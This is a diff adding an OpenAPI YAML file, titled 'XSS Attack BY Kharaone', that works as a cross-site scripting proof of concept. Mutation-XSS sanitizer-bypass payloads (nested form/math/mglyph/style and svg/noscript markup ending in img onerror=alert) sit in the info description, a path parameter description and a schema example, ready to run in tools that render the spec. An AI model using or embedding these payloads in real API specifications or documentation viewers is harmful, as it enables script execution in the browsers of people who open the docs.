@@ -1,0 +1,62 @@
+openapi: 3.0.3
+
+info:
+  title: XSS Attack BY Kharaone
+  version: production
+  description: |
+    <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+
+servers:
+  - url: /JSSResource
+
+paths:
+  /Kharaone:
+    get:
+      tags:
+        - Kharaone_XSS_D
+      summary: Finds all accounts
+      operationId: findAccounts
+      responses:
+        '200':
+          description: No response was specified
+          content:
+            application/json:
+              schema:
+                type: string
+
+  /accounts/groupid/{id}:
+    delete:
+      tags:
+        - accounts
+      summary: Deletes a group by id
+      operationId: deleteGroupById
+      parameters:
+        - name: id
+          in: path
+          required: true
+          description: |
+            <svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;p>&lt;/p>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">
+          schema:
+            type: integer
+            format: int64
+      responses:
+        '200':
+          description: No response was specified
+          content:
+            application/json:
+              schema:
+                type: string
+
+components:
+  securitySchemes:
+    basicAuth:
+      type: http
+      scheme: basic
+
+  schemas:
+    Test:
+      type: object
+      properties:
+        name:
+          type: string
+          example: "<h1>HELLO</h1><img src onerror=alert(2)>"
